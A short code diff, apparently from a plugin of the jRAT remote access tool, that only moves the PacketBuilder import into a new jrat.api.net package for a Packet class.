@@ -3,8 +3,8 @@ package jrat.plugin.dwl.client;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
-import jrat.api.PacketBuilder;
 import jrat.api.Client;
+import jrat.api.net.PacketBuilder;
 
 public class Packet extends PacketBuilder {
 
